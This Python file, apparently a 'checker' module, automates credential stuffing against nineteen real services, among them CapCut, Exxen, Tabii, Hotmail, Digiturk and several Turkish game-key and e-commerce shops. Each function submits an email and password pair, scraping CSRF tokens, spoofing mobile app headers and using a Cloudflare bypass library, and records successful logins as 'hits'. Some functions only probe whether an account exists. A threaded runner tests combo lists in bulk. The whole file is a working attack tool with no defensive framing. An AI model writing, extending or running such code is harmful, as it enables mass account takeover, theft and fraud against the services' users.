# checker_api.py
import base64
import random
import string
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup


def _b(t, l, r):
    try:
        s = t.find(l)
        if s == -1: return None
        s += len(l)
        e = t.find(r, s)
        if e == -1: return None
        return t[s:e].strip()
    except Exception:
        return None


def capcut(e, p):
    h = {"User-Agent": "Mozilla/5.0 Chrome/137.0.0.0", "Content-Type": "application/json"}
    try:
        r = requests.post("https://www.capcut.com/api/login", json={"email": e, "password": p}, headers=h, timeout=15)
        if r.status_code == 200 and "token" in r.text:
            return {"hit": True, "fields": {"user": r.json().get("nickname", e)}}
    except Exception:
        pass
    return {"hit": False}


def oyuncustore(e, p):
    s = requests.Session()
    h = {"User-Agent": "Mozilla/5.0 Chrome/80.0"}
    try:
        r = s.get("https://oyuncustore.net/hesabim/?action=login", headers=h, timeout=15)
        soup = BeautifulSoup(r.text, "html.parser")
        tok = soup.find("input", {"id": "woocommerce-login-nonce"})
        if not tok: return {"hit": False}
        data = {"username": e, "password": p, "woocommerce-login-nonce": tok["value"],
                "_wp_http_referer": "/hesabim/?action=login", "login": "Oturum aç"}
        r2 = s.post("https://oyuncustore.net/hesabim/?action=login", data=data, headers=h, timeout=15)
        if "/downloads/" in r2.text or "hesabim/downloads/" in r2.url:
            return {"hit": True, "fields": {"durum": "premium"}}
    except Exception:
        pass
    return {"hit": False}


def exxen(e, p):
    auth = base64.b64encode(f"{e}:{p}".encode()).decode()
    h = {"User-Agent": "Mozilla/5.0 Android Chrome/131", "Content-Type": "application/json",
         "Authorization": f"Basic {auth}"}
    try:
        payload = {"deviceDetails": {"deviceName": "Chrome", "deviceType": "mobile", "os": "Android", "osVersion": "10"}}
        r = requests.post("https://mw-proxy.app.exxen.com/user/login", json=payload, headers=h, timeout=15)
        if r.status_code == 200 and "bearer" in r.text:
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def tabii(e, p):
    dev = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
    h = {"Content-Type": "application/json; charset=UTF-8", "App-Bundle-Id": "com.trt.tabii.android",
         "App-Name": "Tabii", "App-Version": "90", "Device-Id": dev, "Platform": "AndroidPhone",
         "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)"}
    try:
        r = requests.post("https://eu1.tabii.com/apigateway/auth/v2/login",
                          json={"email": e, "password": p}, headers=h, timeout=15)
        if r.status_code == 200 and "accessToken" in r.text:
            return {"hit": True, "fields": {"durum": "premium"}}
    except Exception:
        pass
    return {"hit": False}


def epinfy(e, p):
    s = requests.Session()
    s.headers.update({"accept": "application/json, text/javascript, */*; q=0.01",
                      "origin": "https://epinfy.com", "referer": "https://epinfy.com/",
                      "user-agent": "Mozilla/5.0 Chrome/120",
                      "x-requested-with": "XMLHttpRequest"})
    try:
        r = s.get("https://epinfy.com/client/kontrol-paneli", timeout=15)
        soup = BeautifulSoup(r.text, "html.parser")
        csrf = soup.find("meta", {"name": "csrf-token"})
        if csrf: s.headers.update({"X-CSRF-TOKEN": csrf["content"]})
        r2 = s.post("https://epinfy.com/client/login", data={"email": e, "password": p}, timeout=15)
        if "kontrol-paneli" in r2.url.lower():
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def s2gepin(e, p):
    h = {"User-Agent": "Mozilla/5.0 Chrome/80", "Accept": "*/*"}
    try:
        r = requests.post("https://api.s2gepin.com/Login/Customer",
                          json={"email": e, "password": p, "otpcode": None, "CaptchaToken": "none"},
                          headers=h, timeout=15)
        if "Giriş Başarılı!" in r.text:
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def idefix(e, p):
    h = {"content-type": "application/json", "sessionid": str(uuid.uuid4()),
         "user-agent": "Mozilla/5.0 Android Chrome/112", "x-platform": "android"}
    try:
        r = requests.post("https://fapi.idefix.com/ecom/customer/login",
                          json={"mail": e, "password": p}, headers=h, timeout=15)
        if r.status_code == 200 and "token" in r.text:
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def ssport(e, p):
    h = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive",
         "Content-Type": "application/json; charset=UTF-8",
         "Host": "api.ssportplus.com", "UILanguage": "tr",
         "User-Agent": "Android_Mobile/2.31.26"}
    try:
        payload = {"action": "SubscriberLogin",
                   "subscriber": {"LoginPreferedMethod": 0, "UILanguage": "tr", "Email": e, "PIN": p},
                   "Devices": [{"PlatformID": 10}], "TSID": int(time.time())}
        r = requests.post("https://api.ssportplus.com/mw/SubscriberLogin", json=payload, headers=h, timeout=15)
        if "SessionID" in r.text:
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def smsonay(e, p):
    h = {"User-Agent": "Mozilla/5.0 Chrome/80",
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "Origin": "https://www.smsonay.com", "Referer": "https://www.smsonay.com/login"}
    s = requests.Session()
    try:
        r = s.post("https://www.smsonay.com/ajax/login", data={"email": e, "password": p}, headers=h, timeout=15)
        if "Başarıyla giriş yaptınız" in r.text:
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def beitod(e, p):
    h = {"User-Agent": "Mozilla/5.0 Chrome/120"}
    s = requests.Session()
    try:
        r = s.get("https://onlineislemler.digiturk.com.tr/Account/Login", headers=h, timeout=15)
        vt = _b(r.text, 'name="__RequestVerificationToken" type="hidden" value="', '"')
        if vt:
            r2 = s.post("https://onlineislemler.digiturk.com.tr/Account/Login",
                        data={"__RequestVerificationToken": vt, "Email": e, "Password": p},
                        headers={**h, "Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "Sisteme giriş yaptınız" in r2.text or "hesabim" in r2.url.lower():
                return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def medyabayim(e, p):
    h = {"User-Agent": "Mozilla/5.0 Chrome/129"}
    s = requests.Session()
    try:
        r = s.get("https://medyabayim.com/", headers=h, timeout=15)
        csrf = _b(r.text, 'name="_csrf" value="', '"')
        if not csrf: return {"hit": False}
        r2 = s.post("https://medyabayim.com/",
                    data={"LoginForm[username]": e, "LoginForm[password]": p, "_csrf": csrf},
                    headers={**h, "Content-Type": "application/x-www-form-urlencoded",
                             "Origin": "https://medyabayim.com"}, timeout=15)
        if "Yanlış kullanıcı adı veya şifre" in r2.text: return {"hit": False}
        if "Hoşgeldin" in r2.text or "logout" in r2.text.lower():
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def ezglobal(e, p):
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 Chrome/80", "Accept": "*/*"})
    try:
        data = f"s1=uyelik&s2=islem&islem=gir&refuser=0&eposta={e}&sifre={p}&ajtip=eval"
        r = s.post("https://www.ezglobalyazilim.com/ajax.php", data=data,
                   headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "Origin": "https://www.ezglobalyazilim.com",
                            "Referer": "https://www.ezglobalyazilim.com/uyelik.html"}, timeout=15)
        if "Üye girişi başarılı" in r.text:
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def oyundinar(e, p):
    import cloudscraper
    try:
        s = cloudscraper.create_scraper()
        h = {"User-Agent": "Mozilla/5.0 Chrome/120"}
        r = s.get("https://www.oyundinar.com/", headers=h, timeout=15)
        soup = BeautifulSoup(r.text, "html.parser")
        tok = soup.find("input", {"name": "_token"})
        if not tok: return {"hit": False}
        r2 = s.post("https://www.oyundinar.com/login",
                    data={"_token": tok["value"], "email": e, "password": p}, headers=h, timeout=15)
        if "hesap" in r2.url.lower() or "panel" in r2.url.lower():
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def hotmail(e, p):
    s = requests.Session()
    h = {"User-Agent": "Mozilla/5.0 Chrome/120"}
    try:
        r = s.get("https://login.live.com/oauth20_authorize.srf?client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D&response_type=code&scope=profile+openid+offline_access", headers=h, timeout=15)
        ppft = _b(r.text.replace('\\"', '"'), 'name="PPFT" id="i0327" value="', '"')
        url_post = _b(r.text.replace('\\"', '"'), 'urlPost":"', '"')
        if not ppft or not url_post: return {"hit": False}
        url_post = url_post.replace("\\/", "/")
        r2 = s.post(url_post, data=f"login={e}&passwd={p}&PPFT={ppft}&PPSX=PassportR",
                    headers={**h, "Content-Type": "application/x-www-form-urlencoded"},
                    allow_redirects=False, timeout=15)
        if r2.status_code == 302 and "code=" in r2.headers.get("Location", ""):
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def bkmkitap(e, p):
    h = {"User-Agent": "Mozilla/5.0 Chrome/81",
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "X-Requested-With": "XMLHttpRequest",
         "Origin": "https://www.bkmkitap.com",
         "Referer": "https://www.bkmkitap.com/uye-girisi-sayfasi"}
    try:
        r = requests.post(f"https://www.bkmkitap.com/srv/customer/signin/email/{e}",
                          data={"password": p, "vendor": "0", "security": ""}, headers=h, timeout=15)
        if "Başarıyla giriş yaptınız" in r.text:
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def snapchat(e, p):
    h = {"origin": "https://www.bitmoji.com", "accept": "application/json, text/plain, */*",
         "referer": "https://www.bitmoji.com/", "user-agent": "Mozilla/5.0 Chrome/95"}
    try:
        r = requests.post("https://bitmoji.api.snapchat.com/api/user/find",
                          json={"email": e}, headers=h, timeout=15)
        if r.status_code == 200:
            return {"hit": True, "fields": {"user_id": r.json().get("user_id", "-")}}
    except Exception:
        pass
    return {"hit": False}


def barlas(e, p):
    s = requests.Session()
    h = {"User-Agent": "Mozilla/5.0 Chrome/120"}
    try:
        r = s.get("https://barlasmedya.com/", headers=h, timeout=15)
        csrf = _b(r.text, 'name="_token" value="', '"')
        if not csrf: return {"hit": False}
        r2 = s.post("https://barlasmedya.com/login",
                    data={"_token": csrf, "email": e, "password": p},
                    headers={**h, "Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
        if "panel" in r2.url.lower() or "dashboard" in r2.url.lower():
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


def supercell(e, p):
    h = {"User-Agent": "Dalvik/2.1.0 (Linux; Android 9)", "Connection": "Keep-Alive"}
    try:
        r = requests.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={e}",
                         headers=h, timeout=15)
        if r.status_code == 200:
            return {"hit": True, "fields": {"id": e}}
    except Exception:
        pass
    return {"hit": False}


def fenix(e, p):
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 Chrome/80", "Accept": "*/*"})
    try:
        boundary = "----WebKitFormBoundary" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
        body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{e}\r\n"
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{p}\r\n--{boundary}--\r\n")
        r = s.post("https://fenixoyun.com/giris", data=body,
                   headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                   allow_redirects=False, timeout=15)
        if r.status_code in (301, 302) and "hesap" in r.headers.get("Location", ""):
            return {"hit": True, "fields": {"durum": "giris basarili"}}
    except Exception:
        pass
    return {"hit": False}


CHECKERS = {
    "capcut": capcut, "oyuncustore": oyuncustore, "exxen": exxen, "tabii": tabii,
    "epinfy": epinfy, "s2gepin": s2gepin, "idefix": idefix, "ssport": ssport,
    "smsonay": smsonay, "beitod": beitod, "medyabayim": medyabayim, "ezglobal": ezglobal,
    "oyundinar": oyundinar, "hotmail": hotmail, "bkmkitap": bkmkitap, "snapchat": snapchat,
    "barlas": barlas, "supercell": supercell, "fenix": fenix,
}

CHECKER_NAMES = {
    "capcut": "CapCut", "oyuncustore": "OyuncuStore", "exxen": "Exxen", "tabii": "Tabii",
    "epinfy": "Epinfy", "s2gepin": "S2GEPIN", "idefix": "İdefix", "ssport": "SSport+",
    "smsonay": "SMSOnay", "beitod": "BEIN x TOD", "medyabayim": "Medya Bayim", "ezglobal": "EZGlobal",
    "oyundinar": "OyunDinar", "hotmail": "Hotmail", "bkmkitap": "BKM Kitap", "snapchat": "Snapchat",
    "barlas": "Barlas", "supercell": "SuperCell", "fenix": "Fenix",
}


def run_checker(name, combos, threads=5):
    fn = CHECKERS.get(name)
    if not fn:
        return {"error": "bilinmeyen checker"}
    hits = 0
    bads = 0
    results = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        fut = {ex.submit(fn, e, p): (e, p) for e, p in combos}
        for f in as_completed(fut):
            e, p = fut[f]
            try:
                r = f.result()
            except Exception:
                r = {"hit": False}
            if r.get("hit"):
                hits += 1
            else:
                bads += 1
            results.append((f"{e}:{p}", r))
    return {"total": len(combos), "hits": hits, "bads": bads, "results": results}